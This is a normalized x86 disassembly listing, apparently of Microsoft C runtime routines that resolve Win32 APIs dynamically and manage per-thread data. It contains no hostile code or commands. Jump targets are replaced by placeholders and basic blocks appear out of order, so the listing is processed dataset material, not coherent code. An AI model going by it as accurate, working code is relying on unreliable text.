push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ esi ]
call sub_42f6f6
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
test eax eax
jne r-xdata
add esi 0x4
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
pop ebp
retn
pop ebp
retn
sub_42f7a5
mov edi edi
push ebp
mov ebp esp
push 0x800
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
xor eax eax
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
pop ebp
retn
sub_42f7dc
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
inc eax
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_42f82a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42f310
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ CompareStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x24
sub_42f89e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_42f1ce
pop ecx
pop ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_42f90b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42f961
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42f9b7
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42fa0d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_42fa66
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x9
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ GetDateFormatW@IAT ]
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x1c
sub_42fae8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xa
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d45a
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_42fb37
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xb
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x78
call [ SetLastError@IAT ]
xor eax eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_42fb9a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xd
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ GetLocaleInfoW@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_42fc04
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xf
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42fc5a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x10
call sub_42f65a
add esp 0x10
mov esi eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ GetTimeFormatW@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x18
sub_42fcca
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x11
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetUserDefaultLCID@IAT ]
push eax
call sub_42fe4d
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_42fd31
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x13
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d45a
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_42fd88
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x14
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0xc
sub_42fdea
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x15
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x1
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ IsValidLocale@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42fe4d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x17
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d526
add esp 0xc
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_42feb7
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x16
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_42ff3f
push eax
call [ LCMapStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x24
sub_42ff3f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x18
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_43d5d0
pop ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_42ff9b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42f580
mov esi eax
test esi esi
je r-xdata
call sub_42d45a
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0xc
sub_42ffe1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42f59a
mov esi eax
test esi esi
je r-xdata
call sub_42d45a
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_43002a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42f5b4
mov esi eax
test esi esi
je r-xdata
call sub_42d45a
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_430073
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1c
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_4300c5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1d
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx esi
call [ r--data ]
call esi
sub_43010e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1f
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d45a
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_430165
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1e
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_4301e8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
push edi
mov ecx esi
call [ r--data ]
call esi
mov edi eax
test edi edi
je r-xdata
pop edi
push r--data
push r--data
push r--data
push 0xc
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push edi
mov ecx esi
call [ r--data ]
call esi
mov eax edi
jmp r-xdata
sub_430267
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x20
pop ecx
[ edi ]
mov al 0x1
pop edi
retn
sub_43028d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xe
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push ebx
push r--data
push r--data
push r--data
push 0x12
call sub_42f65a
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx eax
test ecx ecx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
xor al al
jmp r-xdata
push edi
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x0
push 0xc
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push ecx
mov ecx ebx
call [ r--data ]
call ebx
pop edi
test eax eax
jne r-xdata
pop ebx
mov al [ ebp - 0x8 ]
and al 0x1
sub_430333
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_42f65a
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
cmp ecx 0x1
sete al
jmp r-xdata
push 0x2
pop eax
mov ecx rw-data
xchg [ ecx ] eax
xor al al
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov ecx esi
call [ r--data ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx rw-data
inc ecx
xchg [ edx ] ecx
mov al 0x1
jmp r-xdata
pop esi
sub_4303ba
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_430402
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_4309f3
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_430446
call sub_40d2b6
retn 0xc
sub_430452
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4304a7
call sub_40d2b6
retn 0xc
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_42d3b1
pop ecx
sub_4304b3
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_4309f3
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4304f2
call sub_40d2b6
retn 0xc
sub_4304fe
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43053a
call sub_40d2b6
retn 0xc
sub_430546
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_430452
mov esp ebp
pop ebp
retn
sub_43056e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_430402
mov esp ebp
pop ebp
retn
sub_430596
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4304b3
mov esp ebp
pop ebp
retn
sub_4305be
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4304fe
mov esp ebp
pop ebp
retn
sub_430724
mov eax [ ecx ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
retn
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_42d3b1
pop ecx
sub_430798
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
inc ecx
push 0x43
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x350 ] ecx
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax + 0x48 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] cx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x172 ] cx
mov eax [ ebp + 0x8 ]
and [ eax + 0x34c ] 0x0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_4305be
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_43056e
add esp 0x10
mov esp ebp
pop ebp
retn
sub_43082a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call sub_43084b
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ecx
sub_43084b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx r--data
je r-xdata
push [ eax + 0x3c ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x30 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x34 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x38 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x28 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x2c ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x40 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x44 ]
call sub_42d3b1
mov eax [ ebp + 0x8 ]
push [ eax + 0x360 ]
call sub_42d3b1
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_430546
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x4
call sub_430596
add esp 0x34
mov esp ebp
pop ebp
retn
push ecx
call sub_42d3b1
mov eax [ ebp + 0x8 ]
pop ecx
sub_430902
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push esi
push edi
push 0x364
push 0x1
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push eax
call sub_42f9b7
test eax eax
jne r-xdata
xor edi edi
push esi
push [ rw-data ]
call sub_42fa0d
test eax eax
je r-xdata
retn
push rw-data
push esi
call sub_430798
pop ecx
mov edi esi
xor esi esi
pop ecx
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop edi
pop esi
sub_43095d
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d49d
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_42f9b7
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_42fa0d
test eax eax
jne r-xdata
push ebx
mov ebx edi
push rw-data
push edi
call sub_430798
push ebx
call sub_42d3b1
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
retn
call sub_42d3b1
pop ecx
jmp r-xdata
sub_4309f3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x4c ] eax
pop esi
test eax eax
je r-xdata
push [ esi + 0x4c ]
call sub_43a809
mov eax [ esi + 0x4c ]
pop ecx
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_43a5c0
pop ecx
cmp eax rw-data
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
push eax
call sub_43a63d
pop ecx
sub_430a52
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
push eax
call sub_42f9b7
mov esi eax
test esi esi
je r-xdata
pop esi
push 0x0
push [ rw-data ]
call sub_42fa0d
push esi
call sub_43082a
sub_430a7e
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d49d
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_42f9b7
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_42fa0d
test eax eax
jne r-xdata
push eax
push esi
call [ SetLastError@IAT ]
mov eax edi
pop edi
pop esi
retn
push rw-data
push edi
call sub_430798
push 0x0
call sub_42d3b1
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
call sub_42d45a
call sub_42d3b1
pop ecx
jmp r-xdata
sub_430b02
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_42d49d
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_42f9b7
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_42fa0d
test eax eax
jne r-xdata
push ebx
push esi
call [ SetLastError@IAT ]
mov ebx edi
push rw-data
push edi
call sub_430798
push ebx
call sub_42d3b1
add esp 0xc
test edi edi
jne r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
